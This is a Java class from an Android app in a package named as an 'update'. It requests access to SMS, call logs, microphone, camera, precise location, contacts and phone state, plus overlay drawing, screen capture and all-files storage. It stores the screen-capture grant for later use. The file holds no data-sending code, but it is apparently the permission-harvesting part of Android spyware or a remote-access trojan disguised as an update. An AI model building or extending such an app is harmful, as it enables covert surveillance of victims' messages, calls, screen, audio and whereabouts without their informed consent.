package com.kasari.update;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class PermissionManager {

    private static final int PERMISSION_CODE = 2001;
    private static final int OVERLAY_CODE = 2002;
    private static final int SCREEN_CODE = 2003;
    private static final int STORAGE_CODE = 2004;
    private static boolean screenCaptureGranted = false;
    private static int screenCaptureResultCode = -1;
    private static Intent screenCaptureData = null;

    public static boolean hasAllPermissions(Context context) {
        String[] permissions = getRequiredPermissions(context);
        for (String perm : permissions) {
            if (ContextCompat.checkSelfPermission(context, perm) != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }

    public static String[] getRequiredPermissions(Context context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            return new String[]{
                Manifest.permission.READ_SMS,
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.CAMERA,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.POST_NOTIFICATIONS,
                Manifest.permission.READ_PHONE_STATE
            };
        } else {
            return new String[]{
                Manifest.permission.READ_SMS,
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.PROCESS_OUTGOING_CALLS,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.CAMERA,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.READ_PHONE_STATE
            };
        }
    }

    public static void requestAllPermissions(Activity activity) {
        String[] permissions = getRequiredPermissions(activity);
        boolean needRequest = false;
        for (String perm : permissions) {
            if (ContextCompat.checkSelfPermission(activity, perm) != PackageManager.PERMISSION_GRANTED) {
                needRequest = true;
                break;
            }
        }
        if (needRequest) {
            ActivityCompat.requestPermissions(activity, permissions, PERMISSION_CODE);
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(activity)) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:" + activity.getPackageName()));
                activity.startActivityForResult(intent, OVERLAY_CODE);
            }
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q && !screenCaptureGranted) {
            MediaProjectionManager manager =
                (MediaProjectionManager) activity.getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            if (manager != null) {
                activity.startActivityForResult(
                    manager.createScreenCaptureIntent(), SCREEN_CODE);
            }
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!android.os.Environment.isExternalStorageManager()) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                intent.setData(Uri.parse("package:" + activity.getPackageName()));
                activity.startActivityForResult(intent, STORAGE_CODE);
            }
        }
    }

    public static void handleActivityResult(int requestCode, int resultCode, Intent data) {
        if (requestCode == SCREEN_CODE && resultCode == Activity.RESULT_OK && data != null) {
            screenCaptureGranted = true;
            screenCaptureResultCode = resultCode;
            screenCaptureData = data;
        }
    }

    public static boolean isScreenCaptureGranted() {
        return screenCaptureGranted;
    }

    public static int getScreenCaptureResultCode() {
        return screenCaptureResultCode;
    }

    public static Intent getScreenCaptureData() {
        return screenCaptureData;
    }
}